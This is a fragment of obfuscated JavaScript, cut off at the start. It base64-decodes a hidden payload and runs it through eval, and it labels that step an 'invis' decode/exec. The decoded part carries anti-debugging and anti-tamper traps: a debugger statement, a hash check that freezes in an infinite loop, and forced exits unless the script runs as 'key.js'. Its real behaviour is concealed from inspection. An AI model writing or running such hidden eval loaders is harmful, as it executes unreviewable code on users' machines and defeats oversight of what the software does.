X19fM2gxWzE2MV1dKF9fX19fX2t5Nil9O2lmKF9fX19fX2x4ZSgpKXt3aGlsZShfX19fX18zaDFbNl0pe319fTtyZXR1cm4gX19fX19fa3k2KCl9KSgpO2NvbnNvbGVbX19fX19fM2gxWzE2Nl1dKCJcdTAwMWJcdTAwNWJcdTAwMzNcdTAwMzFcdTAwNmRcdTAwNGYiKyJcdTAwNGVcdTAwNGNcdTAwNTlcdTAwMjBcdTAwNGVcdTAwNGYiKyJceDQ0XHg0NVx4MjBceDRiXHg0NVx4NTkiKyJcdTAwMmVcdTAwNGFcdTAwNTNcdTAwMWJcdTAwNWJcdTAwMzAiKyJcdTAwNmQiKTtfX19fX18ycHQoKTtwcm9jZXNzW19fX19fXzNoMVsxNjhdXShfX19fX18zaDFbMV0pfWNvbnN0IF9fX19fZ3g2PUpTT05bIlx4NzBceDYxXHg3Mlx4NzNceDY1Il0oZnNbIlx4NzJceDY1XHg2MVx4NjRceDQ2XHg2OSIrIlx4NmNceDY1XHg1M1x4NzlceDZlXHg2MyJdKCJcdTAwNzBcdTAwNjFcdTAwNjNcdTAwNmJcdTAwNjFcdTAwNjciKyJcdTAwNjVcdTAwMmVcdTAwNmFcdTAwNzNcdTAwNmZcdTAwNmUiLCJcdTAwNzVcdTAwNzRcdTAwNjZcdTAwMzgiKSk7aWYoX19fX19neDZbX19fX19fM2gxWzE2N11dIT09Ilx1MDA2Ylx1MDA2NVx1MDA3OVx1MDAyZVx1MDA2YVx1MDA3MyIpe2RlYnVnZ2VyO2NvbnNvbGVbX19fX19fM2gxWzE2Nl1dKCJcdTAwMWJcdTAwNWJcdTAwMzNcdTAwMzFcdTAwNmTinYxcdTAwMjBcdTAwNzBcdTAwNjFcdTAwNjNcdTAwNmIiKyJcdTAwNjFcdTAwNjdcdTAwNjVcdTAwMmVcdTAwNmFcdTAwNzNcdTAwNmZcdTAwNmVcdTAwMjBcdTAwNmRcdTAwNjEiKyJcdTAwNjlcdTAwNmVcdTAwMjBcdTAwNjhcdTAwNjFcdTAwNzJcdTAwNzVcdTAwNzNcdTAwMjBcdTAwMjJcdTAwNmIiKyJceDY1XHg3OVx4MmVceDZhXHg3M1x4MjJceDFiXHg1Ylx4MzBceDZkIik7X19fX19fMnB0KCk7cHJvY2Vzc1tfX19fX18zaDFbMTY4XV0oX19fX19fM2gxWzFdKX19Y2F0Y2goX19feTE4KXtfX19fX18ycHQoKTtwcm9jZXNzW19fX19fXzNoMVsxNjhdXShfX19fX18zaDFbMV0pfWZ1bmN0aW9uIF9fX19fXzJwdCgpe3ZhciBfX19fXzlyOT1fX19fX18ycHQuX19fX19fdnAyfHwoX19fX19fMnB0Ll9fX19fX3ZwMj1fX19fX2g2eChfX19fenRxLDY0NzI4MCkpO2lmKF9fX19fOXI5PT09MTg0MDE3ODAwMjQwNjM2KXtyZXR1cm4gX19fX3p0cSguLi5hcmd1bWVudHMpfWVsc2V7d2hpbGUodHJ1ZSl7fX19";var decode=(typeof Buffer!=='undefined')?function(s){return Buffer.from(s,'base64').toString('utf8')}:function(s){return atob(s)};try{eval(decode(b));}catch(e){console.error('invis decode/exec failed',e);}})();